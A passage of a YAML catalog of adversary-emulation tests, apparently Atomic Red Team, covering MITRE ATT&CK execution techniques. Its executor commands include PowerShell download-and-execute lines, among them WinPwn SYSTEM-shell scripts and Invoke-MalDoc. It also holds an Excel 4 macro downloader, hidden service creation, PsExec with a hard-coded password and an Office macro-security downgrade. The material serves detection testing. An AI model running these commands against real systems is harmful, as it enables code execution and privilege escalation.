      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/007
  is_safe: true
- id: T1059.010
  name: AutoHotKey & AutoIT
  description: |-
    Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.[1](https://www.autoitscript.com/autoit3/docs/intro/running.htm)[2](https://www.autohotkey.com/docs/v1/Program.htm)

    Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.[3](https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html)

    These scripts may also be compiled into self-contained executable payloads (`.exe`).[1](https://www.autoitscript.com/autoit3/docs/intro/running.htm)[2](https://www.autohotkey.com/docs/v1/Program.htm)
  tactic: execution
  platforms:
    - windows
  executors:
    - name: AutoHotKey script execution
      type: powershell
      platform: windows
      command: Start-Process -FilePath "$PathToAtomicsFolder\..\ExternalPayloads\ahk\AutoHotKeyU64.exe" -ArgumentList "PathToAtomicsFolder\T1059.010\src\calc.ahk"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1059/010
  is_safe: true
- id: T1072
  name: Software Deployment Tools
  description: "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Entra ID.[1](https://posts.specterops.io/death-from-above-lateral-movement-from-azure-to-on-prem-ad-d18cb3959d4d) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.[2](https://www.mitiga.io/blog/mitiga-security-advisory-abusing-the-ssm-agent-as-a-remote-access-trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.[3](https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality."
  tactic: execution
  tactics:
    - execution
    - lateral-movement
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Radmin Viewer Utility
      type: cmd
      platform: windows
      command: '"%PROGRAMFILES(x86)%/Radmin Viewer 3/Radmin.exe"'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: PDQ Deploy RAT
      type: cmd
      platform: windows
      command: '"%PROGRAMFILES(x86)%/Admin Arsenal/PDQ Deploy/PDQDeployConsole.exe"'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Deploy 7-Zip Using Chocolatey
      type: powershell
      platform: windows
      command: |-
        # Deploy 7-Zip using Chocolatey
        choco install -y 7zip
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1072
  is_safe: true
- id: T1106
  name: Native API
  description: |-
    Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.[1](https://undocumented.ntinternals.net/)[2](https://www.kernel.org/doc/html/v4.12/core-api/kernel-api.html) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

    Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.

    Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.[3](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)[4](https://www.cyberbit.com/blog/endpoint-security/malware-mitigation-when-direct-system-calls-are-used/)[5](https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.[6](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)[7](https://www.gnu.org/software/libc/manual/html_node/Creating-a-Process.html) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.[8](https://docs.microsoft.com/en-us/windows/win32/api/)[9](https://man7.org/linux/man-pages//man7/libc.7.html)[10](https://www.gnu.org/software/libc/)

    Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.[11](https://dotnet.microsoft.com/learn/dotnet/what-is-dotnet-framework)[12](https://developer.apple.com/documentation/coreservices)[13](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/OSX_Technology_Overview/CocoaApplicationLayer/CocoaApplicationLayer.html#//apple_ref/doc/uid/TP40001067-CH274-SW1)[14](https://developer.apple.com/documentation/foundation)

    Adversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks.[15](https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls) Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001).
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Execution through API - CreateProcess
      type: cmd
      platform: windows
      command: |-
        C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"%tmp%\T1106.exe" /target:exe "PathToAtomicsFolder\T1106\src\CreateProcess.cs"
        %tmp%/T1106.exe
      timeout: 120
      is_safe: true
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
      timeout: 120
      is_safe: true
    - name: WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')
      timeout: 120
      is_safe: true
    - name: WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique
      type: powershell
      platform: windows
      command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
      timeout: 120
      is_safe: true
    - name: Run Shellcode via Syscall in Go
      type: powershell
      platform: windows
      command: $PathToAtomicsFolder\T1106\bin\x64\syscall.exe -debug
      cleanup: Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1106
  is_safe: true
- id: T1129
  name: Shared Modules
  description: |-
    Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).

    Adversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.

    The Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.[1](https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/DynamicLibraries/100-Articles/OverviewOfDynamicLibraries.html)[2](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)[3](https://blog.netlab.360.com/stealth_rotajakiro_backdoor_en/)[4](https://unit42.paloaltonetworks.com/unit42-new-improved-macos-backdoor-oceanlotus/)

    The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.[5](https://learn.microsoft.com/troubleshoot/windows-client/deployment/dynamic-link-library)
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: ESXi - Install a custom VIB on an ESXi host
      type: cmd
      platform: windows
      command: |-
        PathToAtomicsFolder\..\ExternalPayloads\pscp.exe -pw pass PathToAtomicsFolder\..\atomics\T1129\src\atomicvibes.vib root@atomic.local:/tmp
        echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibinstall.txt"
      cleanup: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\..\atomics\T1129\src\esxi_vibremove.txt"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1129
  is_safe: true
- id: T1204.002
  name: Malicious File
  description: "An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001). Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, .cpl, .reg, and .iso.[1](https://www.mandiant.com/resources/blog/trojanized-windows-installers-ukrainian-government)\n\nAdversaries may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036) and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027) to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it.[2](https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/) \n\nWhile [Malicious File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)."
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: OSTap Style Macro Execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe C:\Users\Public\art.jse`"`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      cleanup: Remove-Item C:\Users\Public\art.jse -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: OSTap Payload Download
      type: cmd
      platform: windows
      command: |-
        echo var url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\OSTapGet.js
        cscript //E:Jscript %TEMP%\OSTapGet.js
      cleanup: del %TEMP%\OSTapGet.js /F /Q >nul 2>&1
      timeout: 120
      is_safe: true
    - name: Maldoc choice flags command execution
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      timeout: 120
      is_safe: true
    - name: OSTAP JS version
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"C:\Users\Public\art.jse`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   a = Shell(`"cmd.exe /c wscript.exe //E:jscript C:\Users\Public\art.jse`", vbNormalFocus)`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"
      timeout: 120
      is_safe: true
    - name: Office launching .bat file from AppData
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macrocode = "   Open `"$("$env:temp\art1204.bat")`" For Output As #1`n   Write #1, `"calc.exe`"`n   Close #1`n   a = Shell(`"cmd.exe /c $("$env:temp\art1204.bat") `", vbNormalFocus)`n"
        Invoke-MalDoc -macroCode $macrocode -officeProduct Word
      cleanup: |-
        Remove-Item $("$env:temp\art1204.bat") -ErrorAction Ignore
        Get-Process | Where-Object { $_.MainModule.FileName -like "*calculator*" } | Stop-Process
      timeout: 120
      is_safe: true
    - name: Excel 4 Macro
      type: powershell
      platform: windows
      command: |-
        $fname = "$env:TEMP\atomic_redteam_x4m_exec.vbs"
        $fname1 = "$env:TEMP\procexp.exe"
        if (Test-Path $fname) {
          Remove-Item $fname
          Remove-Item $fname1
        }

        $xlApp = New-Object -COMObject "Excel.Application"
        $xlApp.Visible = $True
        $xlApp.DisplayAlerts = $False
        $xlBook = $xlApp.Workbooks.Add()
        $sheet = $xlBook.Excel4MacroSheets.Add()

        if ("$env:Username" -ne "") {
          $sheet.Cells.Item(1,1) = "$env:Username"
        } else {
          $sheet.Cells.Item(1,1) = "=GET.WORKSPACE(26)"
        }

        $sheet.Cells.Item(2,1) = "procexp.exe"
        $sheet.Cells.Item(3,1) = "atomic_redteam_x4m_exec.vbs"
        $sheet.Cells.Item(4,1) = "=IF(ISNUMBER(SEARCH(`"64`",GET.WORKSPACE(1))), GOTO(A5),)"
        $sheet.Cells.Item(5,1) = "=FOPEN(`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`", 3)"
        $sheet.Cells.Item(6,1) = "=FWRITELN(A5, `"url = `"`"https://live.sysinternals.com/procexp.exe`"`"`")"
        $sheet.Cells.Item(7,1) = "=FWRITELN(A5, `"`")"
        $sheet.Cells.Item(8,1) = "=FWRITELN(A5, `"Set winHttp = CreateObject(`"`"WinHTTP.WinHTTPrequest.5.1`"`")`")"
        $sheet.Cells.Item(9,1) = "=FWRITELN(A5, `"winHttp.Open `"`"GET`"`", url, False`")"
        $sheet.Cells.Item(10,1) = "=FWRITELN(A5, `"winHttp.Send`")"
        $sheet.Cells.Item(11,1) = "=FWRITELN(A5, `"If winHttp.Status = 200 Then`")"
        $sheet.Cells.Item(12,1) = "=FWRITELN(A5, `"Set oStream = CreateObject(`"`"ADODB.Stream`"`")`")"
        $sheet.Cells.Item(13,1) = "=FWRITELN(A5, `"oStream.Open`")"
        $sheet.Cells.Item(14,1) = "=FWRITELN(A5, `"oStream.Type = 1`")"
        $sheet.Cells.Item(15,1) = "=FWRITELN(A5, `"oStream.Write winHttp.responseBody`")"
        $sheet.Cells.Item(16,1) = "=FWRITELN(A5, `"oStream.SaveToFile `"`"C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`"`", 2`")"
        $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")"
        $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")"
        $sheet.Cells.Item(19,1) = "=FCLOSE(A5)"
        $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A3&`"`")"
        $sheet.Cells.Item(21,1) = "=WAIT(NOW()+`"00:00:05`")"
        $sheet.Cells.Item(22,1) = "=EXEC(`"explorer.exe C:\Users\`"&A1&`"\AppData\Local\Temp\`"&A2&`"`")"
        $sheet.Cells.Item(23,1) = "=HALT()"
        $sheet.Cells.Item(1,1).Name = "runme"
        $xlApp.Run("runme")
        $xlApp.Quit()

        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
        [System.GC]::Collect()
        [System.GC]::WaitForPendingFinalizers()

        Remove-Variable xlBook
        Remove-Variable xlApp
      cleanup: |-
        Stop-Process -Name "procexp*" -ErrorAction Ignore
        Remove-Item "$env:TEMP\atomic_redteam_x4m_exec.vbs" -ErrorAction Ignore
        Remove-Item "$env:TEMP\procexp.exe" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Headless Chrome code execution via VBA
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
      cleanup: Stop-Process -name mshta
      timeout: 120
      is_safe: true
    - name: Potentially Unwanted Applications (PUA)
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest http://amtso.eicar.org/PotentiallyUnwanted.exe -OutFile $env:TEMP/PotentiallyUnwanted.exe
        & "$env:TEMP/PotentiallyUnwanted.exe"
      cleanup: |-
        Stop-Process -name PotentiallyUnwanted
        Remove-Item $env:TEMP/PotentiallyUnwanted.exe -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Office Generic Payload Download
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        $macroCode = Get-Content "PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt" -Raw
        $URL = "" + "/" + ""
        $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt"
        Invoke-MalDoc -macroCode $macroCode -officeProduct "Word"
      cleanup: Remove-Item "C:\Users\$env:username\Desktop\https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt" -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: LNK Payload Download
      type: powershell
      platform: windows
      command: |-
        Invoke-WebRequest -OutFile $env:Temp\test10.lnk "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
        $file1 = "$env:Temp\test10.lnk"
        Start-Process $file1
        Start-Sleep -s 10
        taskkill /IM a.exe /F
      cleanup: |-
        $file1 = "$env:Temp\test10.lnk"
        $file2 = "$env:Temp\a.exe"
        Remove-Item $file1 -ErrorAction Ignore
        Remove-Item $file2 -ErrorAction Ignore
      timeout: 120
      is_safe: true
    - name: Mirror Blast Emulation
      type: powershell
      platform: windows
      command: |-
        Cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
        New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null
        & '.\Excel 2016.lnk' "PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm"
      cleanup: reg delete "HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security" /v "VBAWarnings" /f
      timeout: 120
      is_safe: true
    - name: ClickFix Campaign - Abuse RunMRU to Launch mshta via PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -Value '"C:\Windows\System32\mshta.exe" http://localhost/hello6.hta'
      cleanup: Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "atomictest" -ErrorAction SilentlyContinue
      timeout: 120
      is_safe: true
    - name: Simulate Click-Fix via Downloaded BAT File
      type: powershell
      platform: windows
      command: |-
        $url = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/click-fix.bat"
        $outfile = "$env:TEMP\click-fix.bat"
        Invoke-WebRequest -Uri $url -OutFile $outfile -UseBasicParsing
        $process = Start-Process -FilePath $outfile -PassThru -WindowStyle Normal
        $process.Id | Out-File "$env:TEMP\click-fix-pid.txt"
      cleanup: |-
        if (Test-Path "$env:TEMP\click-fix-pid.txt") {
          $pid = Get-Content "$env:TEMP\click-fix-pid.txt"
          Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue
          Remove-Item "$env:TEMP\click-fix-pid.txt" -ErrorAction SilentlyContinue
        }
        Remove-Item "$env:TEMP\click-fix.bat" -ErrorAction SilentlyContinue
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1204/002
  is_safe: true
- id: T1559
  name: Inter-Process Communication
  description: "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.[1](https://www.geeksforgeeks.org/inter-process-communication-ipc/#:~:text=Inter%2Dprocess%20communication%20(IPC),of%20co%2Doperation%20between%20them.) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.[2](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)"
  tactic: execution
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Cobalt Strike Artifact Kit pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 1'
      timeout: 120
      is_safe: true
    - name: Cobalt Strike Lateral Movement (psexec_psh) pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 2'
      timeout: 120
      is_safe: true
    - name: Cobalt Strike SSH (postex_ssh) pipe
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 3'
      timeout: 120
      is_safe: true
    - name: Cobalt Strike post-exploitation pipe (4.2 and later)
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 4'
      timeout: 120
      is_safe: true
    - name: Cobalt Strike post-exploitation pipe (before 4.2)
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 5'
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1559
  is_safe: true
- id: T1559.002
  name: Dynamic Data Exchange
  description: |-
    Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

    Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.[1](https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/)[2](https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021)[3](https://technet.microsoft.com/library/security/4053440)

    Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.[4](https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/)[5](https://www.contextis.com/blog/comma-separated-vulnerabilities)[6](https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee)[7](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.[8](https://owasp.org/www-community/attacks/CSV_Injection)[9](https://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/)

    DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).[10](https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html)
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Execute PowerShell script via Word DDE
      type: cmd
      platform: windows
      command: start "$PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx"
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1559/002
  is_safe: true
- id: T1569.001
  name: Launchctl
  description: |-
    Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.[1](https://ss64.com/osx/launchctl.html)

    Adversaries use launchctl to execute commands and programs as [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w "%s/Library/LaunchAgents/%s"</code> or <code>/bin/launchctl load</code> to execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s or [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.[2](https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/)[3](https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/)
  tactic: execution
  platforms:
    - macos
  executors:
    - name: Launchctl
      type: bash
      platform: macos
      command: launchctl submit -l evil -- /System/Applications/Calculator.app/Contents/MacOS/Calculator
      cleanup: launchctl remove evil
      timeout: 60
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1569/001
  is_safe: true
- id: T1569.002
  name: Service Execution
  description: |-
    Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.[1](https://docs.microsoft.com/windows/win32/services/service-control-manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

    [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.[2](https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

    Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.
  tactic: execution
  platforms:
    - windows
  executors:
    - name: Execute a Command as a Service
      type: cmd
      platform: windows
      command: |-
        sc.exe create ARTService binPath= "%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\art-marker.txt"
        sc.exe start ARTService
        sc.exe delete ARTService
      cleanup: del C:\art-marker.txt >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Use PsExec to execute a command on a remote host
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe" \\localhost -i -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula "C:\Windows\System32\calc.exe"'
      timeout: 120
      elevation_required: true
      is_safe: false
